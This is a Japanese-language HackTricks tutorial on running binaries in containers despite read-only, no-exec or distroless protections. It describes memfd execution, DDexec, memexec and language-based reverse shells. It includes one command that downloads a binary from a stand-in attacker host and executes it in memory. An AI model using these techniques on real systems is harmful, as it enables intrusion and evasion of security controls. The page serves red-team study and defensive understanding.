# ファイルシステムの保護をバイパスする：読み取り専用 / 実行不可 / Distroless

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法：

- **HackTricks で企業を宣伝**したい場合や **HackTricks をPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする。
- **Hackingトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味があり、**解読不能なものをハック**したい場合は、**採用中**です！（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 動画

以下の動画では、このページで言及されているテクニックについて、より詳しく説明されています：

- [**DEF CON 31 - ステルスと回避のためのLinuxメモリ操作の探索**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**DDexec-ngとインメモリdlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 読み取り専用 / 実行不可シナリオ

**読み取り専用（ro）ファイルシステム保護**が **Linuxマシン** で **より一般的**になってきており、特にコンテナで見つけることができます。これは、`securitycontext` で **`readOnlyRootFilesystem: true`** を設定するだけで、roファイルシステムでコンテナを実行するのが簡単であるためです：

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
      readOnlyRootFilesystem: true
    command: ["sh", "-c", "while true; do sleep 1000; done"]
```

しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`** は書き込み可能のままであるため、ディスクに書き込むことができないということはありません。ただし、このフォルダは **実行不可保護** でマウントされるため、ここにバイナリをダウンロードしても **実行できません**。

{% hint style="warning" %}
レッドチームの観点からすると、これは **バックドアや `kubectl` のようなシステムにないバイナリ** をダウンロードして実行することを **複雑に** します。
{% endhint %}

## 最も簡単なバイパス：スクリプト

バイナリを言及しましたが、インタプリタがマシン内にある限り、**シェルスクリプト**（`sh` が存在する場合）や **Pythonスクリプト**（`python` がインストールされている場合）など、**スクリプトを実行できます**。

ただし、これだけでは、バイナリバックドアや実行する必要がある他のバイナリツールを実行するのに十分ではありません。

## メモリバイパス

ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行する**のが最善です。なぜなら、**その保護はそこには適用されない**からです。

### FD + exec シスコールバイパス

**Python**、**Perl**、または **Ruby** などの強力なスクリプトエンジンがマシン内にある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタに保存し（`create_memfd` シスコール）、これらの保護によって保護されないため、**fdをファイルとして実行する** **`exec` シスコール** を呼び出すことができます。

これには、簡単に [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) プロジェクトを使用できます。バイナリを渡すと、バイナリが **b64エンコード** された **スクリプト** が生成され、`create_memfd` シスコールを呼び出して **fd** に保存され、**実行するための exec シスコール** が呼び出されます。

{% hint style="warning" %}
これは、PHPやNodeなどの他のスクリプト言語では **スクリプトから生のシスコールを呼び出すデフォルトの方法** がないため、`create_memfd` を呼び出して **バイナリを保存するためのメモリfd** を作成することができないため、これは機能しません。

さらに、`/dev/shm` 内のファイルで **通常のfd** を作成しても、**実行不可保護** が適用されるため、実行できません。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、自分自身のプロセスの **`/proc/self/mem`** を上書きすることで、**プロセスが実行しているアセンブリコードを制御**することができる技術です。

したがって、プロセスによって実行される **シェルコード** を書き込み、プロセスを **変異** させて **任意のコードを実行** することができます。

{% hint style="success" %}
**DDexec / EverythingExec** を使用すると、自分自身の **シェルコード** または **メモリ** から **任意のバイナリ** を **ロードして実行** できます。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec)はDDexecの自然な次のステップです。これは**DDexecシェルコードをデーモン化**したもので、異なるバイナリを実行したいときには、DDexecを再起動する必要はありません。代わりに、DDexec技術を使用してmemexecシェルコードを実行し、**このデーモンと通信して新しいバイナリをロードして実行**できます。

**memexecを使用してPHPリバースシェルからバイナリを実行する例**は[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)で見つけることができます。

### Memdlopen

DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memdlopen)技術は、後で実行するためにメモリにバイナリをロードする**簡単な方法**を提供します。これにより、依存関係を持つバイナリをロードすることさえ可能になります。

## Distroless Bypass

### Distrolessとは

Distrolessコンテナには、ライブラリやランタイム依存関係など、**特定のアプリケーションやサービスを実行するために必要な最小限のコンポーネント**だけが含まれており、パッケージマネージャーやシェル、システムユーティリティなどのより大きなコンポーネントは除外されています。

Distrolessコンテナの目標は、**不要なコンポーネントを排除**し、悪用される可能性のある脆弱性の数を最小限に抑えることで、コンテナの攻撃面を**縮小**することです。

### リバースシェル

Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`などが**見つからない**かもしれません。また、`ls`、`whoami`、`id`などのバイナリも見つかりません。これらは通常、システムで実行するものです。

{% hint style="warning" %}
したがって、通常行うような**リバースシェル**の取得や**システムの列挙**はできません。
{% endhint %}

ただし、侵害されたコンテナが例えばflask webを実行している場合、Pythonがインストールされているため、**Pythonリバースシェル**を取得できます。Nodeを実行している場合はNodeリバースシェルを取得でき、ほとんどの**スクリプト言語**でも同様です。

{% hint style="success" %}
スクリプト言語を使用することで、言語の機能を利用して**システムを列挙**することができます。
{% endhint %}

**`read-only/no-exec`**の保護がない場合、リバースシェルを悪用して**ファイルシステムにバイナリを書き込み**、それらを**実行**することができます。

{% hint style="success" %}
ただし、この種のコンテナでは通常、これらの保護が存在しますが、**以前のメモリ実行技術を使用してそれらをバイパス**することができます。
{% endhint %}

**RCE脆弱性を悪用してスクリプト言語のリバースシェルを取得**し、[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)でメモリからバイナリを実行する方法の**例**を見つけることができます。
